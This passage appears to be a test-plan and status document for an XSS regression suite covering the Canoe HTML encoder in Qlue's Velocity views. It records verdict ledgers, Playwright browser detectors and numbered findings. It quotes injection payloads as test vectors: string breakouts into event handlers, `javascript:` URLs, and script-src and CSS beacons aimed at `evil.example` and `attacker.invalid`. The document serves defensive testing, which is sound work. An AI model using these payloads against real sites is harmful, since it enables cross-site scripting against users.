      rightly. The rows stay `SAFE` and `SUPPRESSED_UNINTENDED` with their F10 citations — the
      citation records why the row exists, not that the row is an exploit — and
      `theFourDesyncRowsRecordAvailabilityAndNotInjection` asserts that they never acquire it by
      accident.

14. **T19–T24: two behaviours the plan got wrong, one new finding, and three properties that hold.**
    The six files split cleanly in two. T19 and T20 are about the *wiring* — whether the encoder runs
    at all, and whether the fast harness is evidence about production. T21–T24 are properties, and
    they are the first tests in this suite that could have found something nobody had written down.
    They did not, which is worth as much as a finding: the three properties hold with no
    counterexample, so what the review says about them is now measured rather than argued.

    - **T20's central claim: the two render paths agree byte for byte.** Fourteen `.vm` fixtures in
      `src/test/resources/canoe/templates/`, each a verbatim copy of a corpus case (asserted, so a
      fixture cannot drift from the case whose verdict it borrows), rendered through the real
      `VelocityViewFactory.render(page, view, writer)` and through `engine.evaluate()`. Identical for
      the representative payload, the inert marker, the empty string, **and every payload the case
      carries** — several hundred comparisons. That is what justifies the rest of the suite's use of
      `evaluate()`, and until now it was an assumption stated in `CanoeTestSupport`'s javadoc.
    - **F22**, found by T20 while building an engine configured the way production configures one.
      `VelocityViewFactory.buildDefaultVelocityProperties()` declares `resource.loaders=class,string`
      and sets `resource.loader.class.cache`, but never `resource.loader.class.class` — for which
      Velocity 2.4.1 has no default — so an engine built from the base class's own properties throws
      at `init()`. Only `ClasspathVelocityViewFactory`'s override repairs it, which means the
      documented extension point ("needs subclassing to provide initialization") does not work. Low,
      availability only, fails loudly at startup; recorded for the same reason F18 is.
    - **The plan was wrong about undefined references.** §A.6 and T19's sketch both said `$missing`
      "renders literally as `$missing`". That is Velocity's default and not Qlue's: production sets
      `runtime.strict_mode.enable=true`, so an undefined reference is a `MethodInvocationException`
      and a bound-but-null one is a `VelocityException` — and the quiet form does **not** help for the
      undefined case, only for the null one. Not a finding (intended, documented, fail-closed), but
      it is load-bearing for the suite: it is the reason an unbound `$_x` is a rendering failure
      rather than a silent bypass, which is what `ViewFactoryRenderTest` asserts about
      `allowDirectOutput()`.
    - **F12 has a consequence that reorders its fix.** The double encoding *neutralises* F2's
      handlers: route a value through an interpolated `#set` and into an unrecognised `on*` attribute
      and the parser's single decode leaves `&#39;` as text rather than as an apostrophe. Fixing F12
      before F1/F2/F19 turns some templates from safe to injectable with no other change. There is
      also a second spelling of the `${_x.` trap the review does not mention — `$!{_x.asis($data)}`
      does not bypass either — and the formal form's output is byte-identical to never having called
      the tool, so the bypass is absent rather than partially applied.
    - **T21: chunking invariance holds, exhaustively, and F9 now has a number.** Every one of the
      9,996 two-way splits of the corpus's 275 templates, plus a seeded sample of 20 multi-way splits
      each, produces identical output, identical rejection and identical final state. Feed the
      identical pieces through `write(char[], offset, length)` instead and one mid-point split
      desynchronises **243 of 275**. The sampled part is the multi-way case only, and it is sampled
      because the space is combinatorial; the two-way sweep is exhaustive.
    - **T23 turns the review's central safety argument into a gate.** The corollary — attacker data
      can never steer the parser — holds over 275 templates x 52 payloads, and the *mechanism* is
      asserted separately against the five encoders rather than inferred from the templates somebody
      chose. Its javadoc says plainly that relaxing `CTX_JS`/`CTX_CSS` suppression requires re-running
      it first, and
      `theJsAndCssContextsPassVacuouslyBecauseTheyEmitNothing` is the row that fails the moment
      `Canoe.java:1074-1081` is uncommented, so the gate announces itself rather than waiting to be
      remembered.
    - **T24 found nothing, and says why that is not the same as "nothing got through".** No payload
      changes any document's shape, over the full cross-product. The file's most important test is
      `structuralEquivalenceDoesNotMeanSafeAndHereAreFourProofs`, which takes four cited
      `KNOWN_VULNERABLE` rows — `srcdoc` (F3), a disarmed `javascript:` URL (F5), a CSS overlay (F4)
      and `onsubmit` (F1) — and asserts that this oracle **cannot see** any of them, naming the test
      that can. A green structural run reads like "no injection" and does not mean it.
    - **Three of the six files carry a non-blind-oracle self-test**, on the pattern §2.4 sets for the
      browser detectors. T21's comparison must notice a dropped character; T23's and T24's properties
      must break when the payload goes through `$_x.asis()` and must *not* break when the same payload
      goes through an encoded reference. The second half of each pair is the one that matters: without
      it, "the oracle noticed" is indistinguishable from "the oracle notices any change at all".

15. **T25–T29: the browser tier lands, every ledger verdict holds, and the observability axis was
    short by 21 rows.** The headline is the one the plan hoped for and did not assume: **128
    browser-relevant invocations, rendered by the same `VerdictEvaluator.render()` the Velocity tier
    uses, served over HTTP from a loopback origin and loaded in Chromium, and not one `SAFE` row
    fired a detector or one `KNOWN_VULNERABLE` row turned out to be a fiction.** Four reviews of this
    suite found wrong verdicts; the browser found none. What it did find is a third of the
    vulnerable rows that no engine acts on, for reasons the ledger structurally cannot see.

    - **T27 is green, and it is the only reason any of the above means anything.** All five
      detectors fire on pages written to trip them, and — the half that is easy to omit — none of
      them fires on a benign page that the same interaction sweep clicks and submits. Two of its
      seven tests exist because a detector was otherwise untestable: the off-origin *navigation*
      classifier has no corpus row that can exercise it (every off-origin payload targets
      `attacker.invalid`, which the route interceptor aborts before it commits), so it is calibrated
      against a second sentinel server on a second ephemeral port; and the window-sentinel assertion
      pins an undocumented Playwright ordering — that an exposed binding is installed *before* init
      scripts registered after it — which is what lets the init script wrap the binding rather than
      clobber it.
    - **21 more invocations are `notBrowserObservable`, in four groups, none of them a wrong
      verdict.** (i) Seven `QUOTE_BREAKOUT/double-quote` rows: every one of those templates puts the
      reference inside a *single*-quoted JavaScript string literal, which a double quote cannot
      close. Item 6 above recorded that `VerdictEvaluator` "is not quote-aware" and "over-reports
      rather than under-reports"; T28 is what turned that sentence into a list of named rows.
      (ii) Three `view-source:` rows — every current engine refuses to navigate web content to it
      ("Not allowed to load local resource"), so the nested attacker URL is never reached.
      (iii) All three `policy.nonce` rows: a nonce does nothing without a Content-Security-Policy,
      and this template has no author nonce for a policy to name. Serving a CSP would be the browser
      tier editing the document under test, and serving one that names the *attacker's* nonce would
      assume the conclusion; demonstrating F20's nonce row needs a template the corpus does not have,
      which is now written down rather than left as a failure nobody could act on.
      (iv) Eight CSS rows, which are F23.
    - **One row was flagged in prose and never in code.** `CSS_BACKSLASH_IS_AN_ESCAPE` has argued
      since T17 that `css.style-inside-url-function` × `PROTOCOL_RELATIVE/backslash` "does NOT fetch
      from the sentinel host". The flag was never set, so the browser tier would have failed on a row
      the corpus had already reasoned out correctly — a note is not an expectation.
    - **F23**, and it is the only new finding the browser produced. A `style` attribute is decoded
      **twice**: the HTML parser turns `&#92;` back into a backslash, and then the CSS tokenizer
      reads that backslash as an escape introducer. Measured: `background:url(/\attacker.invalid/x.js)`
      fetches `/ttacker.invalid/x.js` **from the page's own origin** — `\a` is consumed as a one-digit
      hex escape, and the U+000A it yields is then removed by the URL parser's tab/LF/CR rule, so the
      attacker's host loses its first letter. Every argument in the review is built on *one* decode,
      which is right for `onclick` and `href` and one short for `style`. Its consequence is that
      **F4 is bounded by the CSS container**, in the same shape T16 bounded F6: `background:$x`
      becomes declarations and beacons out, `content:'$x'` stays inside a CSS string, and
      `background:url($x)` becomes a bad-url token and drops the declaration — three templates, all
      `KNOWN_VULNERABLE`, all past T17's colon test, and only one of which a browser acts on.
    - **The corpus found a defect in a detector, which is the direction that matters.** The
      sentinel-origin detector matched the host as a substring, so
      `view-source:https://attacker.invalid/x` in a `srcset` counted as an outbound request —
      Chromium emits a request event for the selected candidate and then blocks it, and nothing left
      the browser. A row the corpus correctly predicted would be silent came back exploited. The
      detector now requires an `http`/`https` scheme. That is a false positive in a security suite,
      found because a row *disagreed in the direction that says the tool is wrong* rather than in the
      direction that says the subject is broken.
    - **Two design decisions worth naming, because both could have made the tier vacuous.** Console
      errors are recorded and are *not* part of "exploited": several rows put the attacker's
      characters live into a position where they produce a `SyntaxError` rather than a call, and
      counting the console would have passed them while proving the opposite of what they claim.
      And the page defines `v`, `h`, `f` and `go` as no-ops, because a corpus handler body calls into
      page script — without them a `ReferenceError` on the first statement aborts the handler before
      the injected second statement runs, and every handler case would have reported a miss for a
      reason unrelated to Canoe.
    - **F17 needed a test the corpus cannot hold.** `prefix.colon-in-a-recognised-handler` with the
      shared payload renders `f({a:1,b:'');__canoePwned('q');//'})`, which is a `SyntaxError` — the
      payload closes the string and the call's parenthesis and leaves the object literal open — so
      the High finding the remediation list was reordered around fires nothing. That is a property of
      the shared payload, not of the sink, and the flag alone would read as "F17 is theoretical".
      `SinkSpecificBrowserTest.f17IsExploitableWithAPayloadShapedForItsPosition` runs `'});…` through
      the same template in a real browser and it executes. The corpus keeps its shared catalogue,
      which is what makes it a fair comparison across templates; the finding gets the one payload
      written for one template.
    - **Only Chromium ran.** Firefox and WebKit are not installed and the browser cache in this
      environment is read-only, so they cannot be. They skip with the reason attached rather than
      silently contributing nothing: `EngineRosterTest` has one row per engine, always, because a
      report with no Firefox rows is otherwise indistinguishable from a report where Firefox was
      never asked for. Everything §5.2 says about cross-engine divergence is therefore still
      **unmeasured**, and three of the four flag groups above are single-engine observations —
      defensible ones (a double quote closes no single-quoted literal anywhere, and CSS tokenization
      is the same specification everywhere), but observations from one engine all the same.

The three corrected verdicts are all cases where `url()` neutralises an off-origin vector by
accident — `%40` in a host makes the URL fail to parse, `%5C` stays a path separator, and `html()`
renders C0 controls as literal `\xNN` text, which is not a valid scheme character. Each is now pinned
with its reason in `CanoeCorpusTest.urlEncodingAccidentsThatMakeOffsiteVectorsSafe`, so the verdicts
flip loudly if the encoder ever changes.

---

## 1. Purpose

Canoe has no tests, and has never had any. The security review dated 2026-07-25 found twelve
issues, six of them exploitable by an attacker who controls only data — twenty and nine
respectively once the findings made while building this suite were added. This plan describes a test
suite that:

1. **Pins today's behaviour**, so the fixes proposed in the review can be made without silently
   changing something else.
2. **Encodes each known vulnerability as an executable case** with a recorded verdict, so that the
   suite acts as a live scoreboard: when a fix lands, the corresponding case flips from
   `KNOWN_VULNERABLE` to `SAFE` and the suite tells you so, loudly.
3. **Explores the space adversarially and by permutation**, so that vulnerabilities nobody has
   written down yet — including whatever the next HTML spec revision introduces — get found by
   construction rather than by inspiration.
4. **Confirms the outcome in a real browser**, because every critical finding in the review turns on
   the order in which the HTML parser decodes character references relative to handing a value to the
   JavaScript, CSS, or URL parser. That is a browser behaviour, and asserting on strings only proves
   what Canoe emitted, not what a browser does with it.

The suite is built in two tiers that share one corpus: an in-JVM Velocity tier that renders and
asserts on bytes, and a Playwright tier that loads the rendered bytes in Chromium, Firefox, and
WebKit and asserts on observable effects.

---

## 2. Ground rules

These are the decisions that shape everything below. They are worth agreeing on before any code is
written, because reversing them later is expensive.

### 2.1 The verdict ledger

Canoe is currently broken in at least six exploitable ways. If the suite asserts on *desired*
behaviour it is red from the first commit, which makes it useless as a regression net for the fixes.
If it asserts only on *current* behaviour it enshrines the vulnerabilities.

So every case in the corpus carries an explicit, reviewed verdict:

```
enum Verdict { SAFE, KNOWN_VULNERABLE, SUPPRESSED_BY_DESIGN, SUPPRESSED_UNINTENDED, REJECTED }
```

- `SAFE` — attacker data reaches the sink inert. The test asserts it stays that way.
- `KNOWN_VULNERABLE` — attacker data reaches the sink live. The test asserts the vulnerability is
  *still present*, cites the finding ID, and **fails when the vulnerability disappears**. That
  failure is the signal to update the ledger, not a bug.
- `SUPPRESSED_BY_DESIGN` — Canoe emits the empty string, and that is the intent. Refusing to output
  into JavaScript and CSS contexts is the centrepiece of Canoe's design, so these record the
  component working.
- `SUPPRESSED_UNINTENDED` — Canoe emits the empty string where it should have emitted an encoded
  value. Fail-safe but a defect; F7 and F11 live here. Tracked separately from the above, because a
  defect count that can never reach zero tells you nothing.
- `REJECTED` — Canoe raises an encoding error. Per **F13**, this is worse than the review assumed:
  the `[Encoding Error]` recovery branch is unreachable, so the exception escapes as a 500.

The two suppression verdicts are interchangeable to the *observer* — `VerdictEvaluator` sees an empty
value and cannot tell design from accident. That distinction is the reviewer's, and is recorded in
the ledger rather than derived.

> **There is a sixth verdict since R26 of `REMEDIATION-PLAN.md` (2026-07-27), and this document is
> otherwise left as the record of what the suite was built to be.** `ACCEPTED_RESIDUAL` — attacker
> data reaches the sink live, and the reached sink is **not code execution**. It exists because the
> last 68 `KNOWN_VULNERABLE` invocations were all F6 on surfaces R9 origin-filtered by design and
> could not be driven to zero by fixing anything: an off-origin `<a href>`, `<img src>` or
> `<form action>`. It keeps every property `KNOWN_VULNERABLE` has — it cites a finding, and it
> **fails when the data stops reaching the sink** — and adds two: a required `ResidualSink` naming
> what the browser does with the value instead, and a pinned list of the cases allowed to hold it.
> Its asymmetry in `matches()` is the deliberate counterpart to the symmetric one above: the
> observer sees `KNOWN_VULNERABLE` for these rows and that is the *only* observation the verdict
> accepts. `KNOWN_VULNERABLE` itself is now asserted to be **zero**.

The suite is green today and green after the fixes; it is red exactly during the window when
behaviour changed and the ledger has not been updated. That is the property we want.

**The ledger is asserted, not merely recorded.** `VerdictEvaluator` derives the observed verdict
independently of what the corpus claims, and `CanoeCorpusTest.ledgerMatchesObservedBehaviour` fails
on disagreement. Without it the corpus is a pile of opinions: the first review of the seeded corpus
found three wrong verdicts out of fourteen cases, and no test caught them. The evaluator has its own
non-blind-oracle self-test, for the same reason the browser detectors do.

### 2.2 One corpus, two tiers

The permutation space is large (Appendix A lists roughly 2,000 base cases before payload
multiplication). Declaring it twice — once for the Velocity tests and once for the browser tests —
guarantees the two drift apart.

Instead there is a single Java-declared corpus. The Velocity tier renders every case and asserts on
the bytes. The browser tier consumes the *same* case objects, takes the rendered bytes, serves them,
and asserts on effects. The browser tier runs a filtered subset by default (Appendix A, §A.9) because
several thousand page loads across three engines is a coffee break, not a test run.

### 2.3 Assert on effects, not on strings, wherever a browser is involved

String assertions in the browser tier are a trap: they encode the tester's belief about which byte
sequences are dangerous, which is precisely the belief that failed in `setTagAttributeContext()`.
The browser tier asserts on: script execution, dialogs, network requests to a sentinel origin,
navigations, and DOM structural divergence. See §5.2.

### 2.4 The oracle must be proven non-blind

A browser-based security test that never fails is indistinguishable from a browser-based security
test that is broken. Task T27 builds a deliberately unencoded control corpus that **must** trip every
detector. If the meta-test goes green, the detectors are trusted; if any detector fails to fire, the
browser tier is meaningless until it is fixed.

### 2.5 Scope

Consistent with the review and with Canoe's stated design intent: **the attacker controls data only,
never the template.** `$_x.asis()`, `allowDirectOutput()`, and the `$_x.` bypass prefix are tested for
*correct function* (they must bypass when asked, and must not bypass when not asked) but a template
author who calls them is out of the threat model.

---

## 3. What was verified in this repository

The following were checked directly against the working tree at `ec8d9a9` before writing this plan,
so the tasks below rest on facts rather than assumptions.

**The harness can avoid the servlet stack entirely.** `VelocityViewFactory.render()` needs a `Page`,
a `QlueApplication`, and a `TransactionContext`. None of that is necessary to exercise Canoe. This is
sufficient and was confirmed working:

```java
VelocityEngine engine = new VelocityEngine(new Properties());
engine.init();

StringWriter sw = new StringWriter();
Canoe canoe = new Canoe(sw);
VelocityContext ctx = new VelocityContext();
ctx.put("data", payload);

EventCartridge ec = new EventCartridge();
ec.addReferenceInsertionEventHandler(new CanoeReferenceInsertionHandler(canoe));
ec.attachToContext(ctx);

engine.evaluate(ctx, canoe, "case-id", templateString);
canoe.flush();
```

`engine.evaluate()` takes the template as a `String`, so no resource loader and no `.vm` files are
needed for the bulk of the suite. (`StringResourceLoader` was tried first and is *not* the right
choice — `VelocityViewFactory` sets `resource.loader.string.repository.static=false`, so
`StringResourceLoader.getRepository()` returns null.)

**`src/test/resources` is already on the test classpath.** `build/resources/test` exists. The
review's build note in F8 saying the source set must be extended is wrong; `.vm` fixtures can live in
`src/test/resources` today.

**Dependency locking is declared but no lock files exist.** `build.gradle` has
`dependencyLocking { lockAllConfigurations() }`, but there is no `gradle/dependency-locks/` directory
and no `gradle.lockfile`. New test dependencies can be added without a `--write-locks` run. If locks
are generated later, that changes.

**Toolchain:** Gradle 9.6.1, JDK 25 (Temurin). Maven Central is reachable. Latest versions at time of
writing: JUnit Jupiter 6.1.2, junit-vintage-engine 6.1.2, Playwright Java 1.61.0, jsoup 1.22.2.
(`build/classes` currently holds class-file v70 artifacts built by a JDK 26 elsewhere; a clean build
fixes that.)

**Findings confirmed empirically.** Running the harness above reproduced F1 (`onsubmit` injectable),
F2 (`onfocus` injectable), F3 (`srcdoc` injectable), F4 (`style="color:$x"` html-encoded rather than
suppressed), F5 (the same `javascript:` template encodes differently depending on whether a
preceding attribute name was 11+ characters), F6 (`<script src="$x/app.js">` with `x=//evil.example`
passes through byte-for-byte), and F11 (`<a href=$x>` renders empty).

**F12 is no longer unverified — it reproduces.** `#set($msg = "Hello $data")<p>$msg</p>` with
`data = "<b>"` renders `<p>Hello &amp;lt&#59;b&amp;gt&#59;</p>` — visibly double-encoded. Note the
narrower true scope: only *interpolated string literals* trigger it. A plain `#set($u = $data)`
followed by `<a title="$u">` single-encodes correctly.

**Six behaviours were found that the review does not record.** All are availability rather than
security defects, but they will hit any real template and they belong in the suite (Task T11). The
last row was added by T11 itself and is recorded as F18, which is why the count reads six and not the
five this paragraph originally claimed:

| Input | Result |
|---|---|
| `<br/>` | **Encoding error** — `/` immediately after a tag name is rejected. `<br />` and `<img src="a.png"/>` are both fine; it is only `/` with no intervening attribute or space. XHTML-style void elements break the page. |
| `<p>5 < 6</p>` | **Encoding error** — "Tag name too short". A literal `<` in body text kills the render. |
| `<data-widget-configuration-attribute-name>` | **Encoding error** — `MAX_TAGNAME_LEN` is 36. Long custom element names are rejected. |
| `</ p>`, `</>` | **Encoding error** — "Tag name too short". |
| C0 control characters in body text | **Encoding error** — "Invalid character detected in output". Correct, but undocumented, and it means any stray control byte in template text takes the page down. |
| `<!-- c --><!DOCTYPE html>` | **Encoding error** — "DOCTYPE declaration must be at the beginning". Found by T11 and recorded as F18: `tagCount` counts comments, so a licence header above the DOCTYPE is fatal. |

Also confirmed: `${_x.asis($data)}` in formal notation does **not** bypass encoding, while
`$_x.asis($data)` and `$!_x.asis($data)` do — because
`CanoeReferenceInsertionHandler` matches on the literal prefixes `$_x.` and `$!_x.`, which
`${_x.` does not start with. A developer switching to formal notation silently changes behaviour.

---

## 4. Deliverables

Everything above the `browser/` line exists today, including the `property/` package (T21–T24) and
the `.vm` fixtures T20 needed; everything from `BrowserTestBase` down is planned. The list was
checked file by file against the working tree on 2026-07-26, because it had drifted — three delivered
files and four support classes were missing from it, and `Verdict` had gained a fifth constant.

```
src/test/java/com/webkreator/qlue/
    CanoeProbePage.java                 a real Page + QlueApplication, so the production render
                                        path can be driven; here because setApp() is package-private
src/test/java/com/webkreator/qlue/view/
    CanoeStateProbe.java                a Canoe exposing state, buf and bufLen; here because the
                                        buffer is package-private
src/test/java/com/webkreator/qlue/view/velocity/
    ProductionRenderProbe.java          drives the real VelocityViewFactory.render(); here because
                                        VelocityView's constructor is package-private (F13)
src/test/java/com/webkreator/qlue/view/canoe/
    CanoeTestSupport.java          harness: render(), context probes, assertions
    CanoeTestSupportTest.java           the harness's own tests, incl. the F1 smoke test
    CanoeStateMachineTest.java     T6   direct state machine / currentContext(); the on* table (F19)
    CanoeWriterContractTest.java   T7   Writer API, offsets, chunking (F9)
    HtmlEncoderTest.java           T8   encoder primitives, codepoint sweeps
    HtmlEncoderUrlTest.java        T9   url() as an origin filter (F6)
    AttributePrefixTest.java       T10  detectAttributePrefix() / setTagAttributeContext() (F4, F5,
                                        F7, F17)
    CanoeRobustnessTest.java       T11  templates Canoe rejects (F13, F14, F18)
    corpus/
        Verdict.java                    SAFE | KNOWN_VULNERABLE | SUPPRESSED_BY_DESIGN |
                                        SUPPRESSED_UNINTENDED | REJECTED
        SinkKind.java                   which parser consumes the value
        Payload.java                    one payload: slug, value, family
        XssCase.java                    id, template, sink, payload set, verdict, finding ref
        Payloads.java                   payload families (Appendix B)
        CanoeCorpus.java                the case catalogue (Appendix A)
        CanoeCorpusTest.java            asserts the ledger against observed behaviour (§2.1)
        VerdictEvaluator.java           derives the observed verdict independently of the ledger
        UrlOracleTest.java              VerdictEvaluator.analyseUrl against Node's WHATWG parser
    velocity/
        BodyContextTest.java       T13  the "what is not affected" claim, as a property
        AttributeNameMatrixTest.java T14  the ~90-name matrix and the ATTR_* partition (F21)
        EventHandlerMatrixTest.java  T15  on* allowlist vs the HTML Standard's event handler set
        UrlSinkTest.java           T16
        CssContextTest.java        T17
        ScriptAndStyleElementTest.java T18
        VelocityIntegrationTest.java T19  reference forms, directives, $_x bypass (F12)
        ViewFactoryRenderTest.java T20  full VelocityViewFactory.render() path (F13, F22)
    property/
        ContextRecordingCanoe.java      a Canoe that records currentContext() per reference, which
                                        is the only place "the context at this reference" exists
        ChunkInvarianceTest.java   T21  chunk invariance; F9's blast radius
        BufferResidueTest.java     T22  F5, parameterised over prefix length
        ParserSteeringTest.java    T23  the review's corollary, as a property
        DomEquivalenceTest.java    T24  jsoup differential oracle
    browser/     (delivered in src/browserTest/java, not src/test/java, so `test` stays hermetic)
        BrowserSmokeTest.java      T2   Playwright resolves, a browser launches, a page loads
        SentinelServer.java        T25  loopback HTTP origin, ephemeral port, request log
        SentinelServerTest.java    T25  content type, 404 policy and the log, over plain HTTP;
                                        plus a real page load whose /beacon request is in the log
        BrowserEngine.java              chromium / firefox / webkit, named rather than assumed
        BrowserVerdict.java             what the five detectors saw; `exploited()` excludes console
        BrowserTestBase.java       T26  Playwright lifecycle, detectors, trace+screenshot on failure
        EngineRosterTest.java           one row per engine, always, so a skip is visible
        DetectorSelfTest.java      T27  the meta-test: detectors must fire, and must not always fire
        BrowserCorpusTest.java     T28  corpus × the engines that launched
        SinkSpecificBrowserTest.java T29 srcdoc, xlink:href, meta refresh, base href, CSS
                                        exfiltration, F23, F17, the sandbox pair
    report/
        MatrixReportTest.java      T33  emits build/reports/canoe/matrix.md

src/test/resources/canoe/
    html-event-handler-attributes.txt   the HTML Standard's event handler content attributes, with
                                        their provenance and transcription date in the header; read
                                        by T15's completeness guard
    templates/*.vm                      14 file-backed templates for T20, each a verbatim copy of a
                                        corpus case, plus two for the production switches
```

T20 is delivered. `ProductionRenderProbe` — built by T11 to pin F13 against the production predicate
rather than a copy of it — gained a second engine with production's `class,string` loader pair and an
`Options` object for the two factory switches; `CanoeProbePage` gained an `allowDirectOutput`
constructor. `CanoeTestSupport` gained two things for this batch: `publishFragment()`, so `#parse` and
`#include` fixtures can be registered without reaching into a repository that does not exist until the
engine initialises, and a `render()` overload taking a `Canoe` factory, which is what lets T23 observe
the context at each reference position.

---

## 5. Design of the two tiers

### 5.1 Velocity tier

Renders a case through `engine.evaluate()` into a `Canoe` wrapping a `StringWriter`, exactly as in
§3. Assertions available to a case:

- **Exact output** — for golden cases where the byte string is the point.
- **Context probe** — write a template prefix into a bare `Canoe` and assert `currentContext()`.
  Cheapest way to test the state machine; no Velocity involved.
- **Structural equivalence** — parse the rendered output with jsoup and compare its shape against the
  same template rendered with an inert marker value. Any difference in element count, tag names, or
  attribute names means the payload changed document structure. See T24.
- **Sink liveness** — for a case whose sink is a URL, extract the attribute value and assert whether
  it is a same-origin relative reference or reaches an attacker origin. For a JS sink, assert whether
  the attacker's syntactically significant characters survive *after HTML entity decoding*, which is
  the step the review identifies as the whole story. This originally named `'`, `"`, `(`, `)`, `;`
  and `\`, which is right about significance and wrong about sufficiency: `(`, `)` and `;` are inert
  until the string literal has been closed, and `ENTITY_PRE_ENCODED` carries a `;` in every one of its
  character references while escaping nothing. `VerdictEvaluator` tests for the quote marks and the
  backslash — the characters that can actually close the literal — and records the two limitations
  that follow (it is not quote-aware, and it assumes the reference sits inside a string literal),
  both of which over-report rather than under-report.

That last point deserves emphasis, because it is the single most important assertion helper in the
suite:

```java
// Wrong: asserts on what Canoe emitted.
assertFalse(rendered.contains("');alert("));

// Right: asserts on what the browser will hand to the JavaScript parser.
String attrValue = jsoup.parse(rendered).selectFirst("form").attr("onsubmit");
assertFalse(attrValue.contains("');alert("));
```

jsoup performs the entity decoding, so `&#39;&#41;` becomes `');` — which is exactly why F1 is
critical and why a naive string assertion would have called it safe.

### 5.2 Browser tier

Playwright Java, Chromium + Firefox + WebKit. Each case is written to an HTML file, served from a
loopback HTTP server on an ephemeral port (`com.sun.net.httpserver`), and loaded. `file://` is not
used: meta refresh, form submission, `<base href>`, and same-origin semantics all behave differently
there.

Five detectors, all wired before navigation:

| Detector | Mechanism | Catches |
|---|---|---|
| Script execution | `page.exposeFunction("__canoePwned", …)`; payloads call it. Plus an `addInitScript` sentinel on `window`. | event handlers, `javascript:` URLs, `srcdoc`, injected `<script>` |
| Dialogs | `page.onDialog` — record and dismiss | `alert`/`confirm`/`prompt` payloads |
| Sentinel origin | `page.route("**://attacker.invalid/**", …)` records and aborts | `<script src>`, `<img src>`, CSS `url()` beacons, `srcset`, `ping`, `@import` |
| Navigation | `page.onFrameNavigated`, `page.onPopup`, `onRequest` for top-level document loads | meta refresh, `formaction`, `action`, `base href` hijack, open redirect |
| Console | `page.onConsoleMessage` filtered to errors | mangled output, broken syntax — feeds the `SUPPRESSED`/`REJECTED` ledger |

The sentinel host is `attacker.invalid` — a reserved TLD that can never resolve, so a detector miss
degrades to a connection failure rather than a real outbound request. Requests are additionally
intercepted and aborted.

A case's browser verdict is the union of what fired. It is compared against the ledger verdict from
the corpus. Divergence in either direction fails the test — **except where the corpus says in advance
that no engine will fire.**

That exception is a third axis, `XssCase.isBrowserObservable(payload)`, and it is not a loophole; it
is what stops the two tiers' definitions from colliding. §2.1 says a `KNOWN_VULNERABLE` row means
attacker data reached the sink live, and §8 says explicitly that a dead vector is still a Canoe defect
if Canoe emitted the payload live. This section says divergence fails the test. Both are right, and
together they make about two dozen rows guaranteed failures on the day this tier lands:

| Rows | Why no detector can fire |
|---|---|
| `url.srcset` × every live `JS_URL` payload | `srcset` is an image-source list. An image source is fetched, never navigated to or executed; no engine has ever run a `javascript:` srcset candidate |
| `url.action`, `url.formaction`, `url.xlink-href` × `vbscript`, `data-html` | VBScript has no engine left; a `data:text/html` document is blocked from top-level navigation everywhere |
| `css.style-*` × `expression` | An Internet Explorer extension, gone with IE11 |
| `residue.data-url-armed-buffer` × all four | A `data:` URL carrying markup, in a background-**image** attribute. The browser decodes it, fails to recognise an image, and stops |
| `handler.onreadystatechange`, `handler.onvisibilitychange` | HTML Standard §8.1.8.2 table 4 defines both as IDL attributes on `Document` and **not** as content attributes. No element hosts either, so no engine registers a listener from markup. The Canoe defect is unchanged — both take the `ATTR_HTML` fall-through — and no detector can fire |
| `handler.onshow` | The `show` event was removed from the HTML Standard in 2022 and Gecko's `<menuitem>` went with Firefox 85 |

*Extended 2026-07-26 by T28, which loaded all of the above and found four more groups.* These were
measured rather than predicted, and the table is left split in two so the difference is visible: the
rows above were reasoned out before any browser ran, the rows below were found by running one. All
21 are `KNOWN_VULNERABLE` and stay that way.

| Rows | Why no detector can fire |
|---|---|
| `QUOTE_BREAKOUT/double-quote` × `handler.onsubmit`, `handler.onfocus`, `handler.onselect`, `prefix.colon-in-a-recognised-handler`, `prefix.url-literal-in-a-recognised-handler`, `prefix.vbscript-not-in-the-table`, `residue.js-url-armed-buffer` | Every one of those templates puts the reference inside a **single**-quoted JavaScript string literal. A double quote cannot close one, so the payload arrives live and stays a string. `VerdictEvaluator` is deliberately not quote-aware (§0 item 6) and over-reports here; the single-quote sibling of each row is the one that runs |
| `prefix.colon-in-a-recognised-handler` × `QUOTE_BREAKOUT/single-quote` | Not a dead engine: `f({a:1,b:'');__canoePwned('q');//'})` is a `SyntaxError`, because the payload closes the string and the call's parenthesis and leaves the object literal open. A payload written for the position does execute — `SinkSpecificBrowserTest.f17IsExploitableWithAPayloadShapedForItsPosition` |
| `prefix.vbscript-not-in-the-table` × both | No VBScript engine remains, so nothing parses the href. The case's own note said so; the flag had not caught up |
| `url.action`, `url.formaction`, `url.xlink-href` × `view-source` | Every current engine refuses to navigate web content to `view-source:` — Chromium answers "Not allowed to load local resource" and never issues the request |
| `policy.nonce` × all three | A nonce does nothing without a CSP, and the template has no author nonce for one to name. Serving a policy would be the tier editing the document under test |
| `css.style-inside-a-quoted-css-string` × all three | The payload stays inside a CSS string literal; none of the CSS payloads carries an apostrophe to escape it with |
| `css.style-inside-url-function` × the three `CSS_INJECTION` payloads | Each carries a nested `url(`, and a `(` inside an unquoted url token makes it a bad-url token, dropping the whole declaration |
| `css.style-inside-url-function` × `PROTOCOL_RELATIVE/backslash`, `/double-backslash` | CSS reads the backslash as an escape. This is **F23**: the measured request is `/ttacker.invalid/x.js` on the page's own origin |

Flagging them is strictly better than the two alternatives. Dropping them from the corpus loses the
Canoe defect; rewriting the verdict to "safe because no browser runs it" invents a second meaning for
`SAFE` that the Velocity tier would then have to honour. The flag says: this row is a claim about
Canoe's output, the browser tier should expect silence, and if a detector *does* fire that is a
finding about the browser worth reading. `CanoeCorpusTest.browserObservabilityIsOnlyClaimedWhereIt`
`ChangesAnExpectation` keeps it from becoming a way to excuse a row — it may only be set on a
`KNOWN_VULNERABLE` pairing in a browser-relevant case, because anywhere else it changes no
expectation and only hides the reasoning.

Browser tests are gated: JUnit tag `browser`, a separate `./gradlew browserTest` task, excluded from
`./gradlew test`. `./gradlew test` must stay hermetic, offline-capable, and fast.

---

## 6. Tasks

Each task is sized to be completed and reviewed on its own. Dependencies are noted; anything without
a dependency can start immediately.

### Phase 0 — Build and harness

**T1. Add test dependencies and switch to the JUnit platform.**
Add `junit-jupiter:6.1.2`, `junit-vintage-engine:6.1.2` (keeps the existing `TestRouting` running
unchanged), and `jsoup:1.22.2`. Set `test { useJUnitPlatform() }`. Confirm `TestRouting` still passes.
*Done when:* `./gradlew test` is green with zero test changes.

**T2. Add the Playwright dependency and a gated `browserTest` task.**
Add `com.microsoft.playwright:playwright:1.61.0`. Register a `browserTest` task with
`useJUnitPlatform { includeTags 'browser' }`, and add `excludeTags 'browser'` to `test`. Add a
`playwrightInstall` task wrapping the CLI browser download, honouring `PLAYWRIGHT_BROWSERS_PATH`.
